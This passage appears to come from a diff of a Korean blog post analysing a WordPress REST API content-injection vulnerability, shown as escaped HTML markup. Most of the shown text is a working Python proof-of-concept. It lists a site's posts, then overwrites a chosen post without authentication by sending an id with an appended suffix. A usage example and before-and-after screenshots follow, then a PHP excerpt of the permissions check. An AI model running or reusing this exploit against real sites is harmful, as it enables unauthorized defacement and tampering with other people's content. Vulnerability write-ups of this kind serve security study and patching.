-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;def&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_posts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;respone&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urllib2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'wp/v2/posts'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;posts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;respone&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;posts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' - Post ID: {0}, Title: {1}, Url: {2}'&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;              &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'title'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'rendered'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'link'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;def&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update_post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;post_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;post_content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# more than just the content field can be updated. see the api docs here:&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# https://developer.wordpress.org/rest-api/reference/posts/#update-a-post&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'content'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;post_content&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'wp/v2/posts/{post_id}/?id={post_id}abc'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urllib2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Content-Type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'application/json'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urllib2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'* Post updated. Check it out at {0}'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'link'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;def&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print_usage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Usage: {0} &amp;lt;url&amp;gt; (optional: &amp;lt;post_id&amp;gt; &amp;lt;file with post_content&amp;gt;)'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__file__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# ensure we have at least a url&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print_usage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# if we have a post id, we need content too&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Please provide a file with post content with a post id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print_usage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'* Discovering API Endpoint'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_api_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'* API lives at: {0}'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# if we only have a url, show the posts we have have&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'* Getting available posts'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_posts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# if we get here, we have what we need to update a post!&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'* Updating post {0}'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update_post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api_url&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'* Update complete!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Exploit Code에 대한 간략한 설명은 아래와 같습니다.&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;argv[1] : 대상 도메인&lt;br /&gt;
-argv[2] : 대상 게시물 번호&lt;br /&gt;
-argv[3] : 대상 게시물에 변경할 내용&lt;br /&gt;
-python poc.py [대상 도메인] [게시물 번호] [변경할 내용을 담은 파일]&lt;br /&gt;
-ex) python poc.py http://IP/wordpress/ 4 content&lt;br /&gt;
-&lt;br /&gt;
-존재하는 게시물 목록을 조회하고 JSON인코딩한 데이터를 공격자가 지정한 게시물의 내용을 전송합니다.&lt;/p&gt;
-
-&lt;h5 id=&quot;취약점-공격-테스트&quot;&gt;취약점 공격 테스트&lt;/h5&gt;
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x01_5.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;[그림 1-5]
-  공격 전 게시물 내용
-&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x01_6.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;[그림 1-6]
-  Exploit Code 실행
-&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x01_7.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;[그림 1-7]
-  공격 후 게시물 내용
-&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;update_item_permissions_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_dir&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/tmp/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#fclose($log_file);
-&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$post&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get_post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$post_type&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get_post_type_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;post_type&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_txt&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;var_export&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_file&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;log.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;w+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;  &lt;/span&gt;
